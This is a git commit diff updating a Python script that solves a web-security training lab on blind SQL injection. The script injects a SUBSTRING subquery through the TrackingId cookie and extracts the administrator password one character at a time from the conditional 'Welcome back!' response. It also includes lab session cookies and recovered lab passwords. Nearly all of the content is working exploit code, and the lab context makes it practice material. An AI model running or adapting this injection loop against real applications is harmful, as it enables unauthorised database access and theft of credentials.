0bf5be913d87b90991d7f846afb5f1c44a86ed6b
ahmedabdulwhhab <80491399+ahmedabdulwhhab@users.noreply.github.com>
2024-10-18 21:28:29 +0300

    Update Blind SQL injection with conditional responses.py

--- Blind SQL injection with conditional responses.py
+++ Blind SQL injection with conditional responses.py
@@ -1,18 +1,21 @@
-
-# Source was from
-#https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
+# https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
 import requests, string, sys, warnings, time
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 warnings.simplefilter('ignore', InsecureRequestWarning)
 
 req = requests.Session()
-url = "https://0a75002804a20d16848650000019003d.web-security-academy.net/filter?category=Pets"
+url = "https://0a6400610401492b814ef27000cd0074.web-security-academy.net/filter?category=Gifts"
 hint = "Welcome back!"
 
 # Cookie: TrackingId=h2dGFtb9XTYwq4zk; session=6hkZoumrQhrU9o4i03CQxdXkDpyTiePP
+#Cookie: TrackingId=U4C6AppR7kGOstFd; session=nHnUJ2tbo31l0bUHGZSA2lE3ftDRP5Vp
+#Cookie: TrackingId=8HXcwxySckfsKq6Z; session=IRUMYWTNYDfVa7bqbHB1kxWsSe73E9vV
+
+#TrackingId=4IQa4cVqolskHiiD; session=rgNepCADsCnJlsOEltsnzx9xRVSc4fw2
 password = ""  # ag2yj74y5ng8k1uvbxni // length 21
 # kthtccl0eonf2ki7z3ew
+#ooll8jzd4dy2pmrdr7ql
 index = 1
 password_length = 20
 
@@ -27,11 +30,14 @@ while True:
         break
     for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
         sys.stdout.write(f"\r[+] Password: {password}{char}")
-        cookies = {
-            "session": "6hkZoumrQhrU9o4i03CQxdXkDpyTiePP",
-            "TrackingId": f"h2dGFtb9XTYwq4zk' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
+        cookies = {             #NOTICE EVERY TRIAL , WE RESET COOKIES
+            "session": "rgNepCADsCnJlsOEltsnzx9xRVSc4fw2",
+            "TrackingId": f"4IQa4cVqolskHiiD' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
         }
         resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
         if hint in resp.text:
             password = password + char
             index = index + 1
+            if index > password_length:
+                print("\n Finished")
+                break
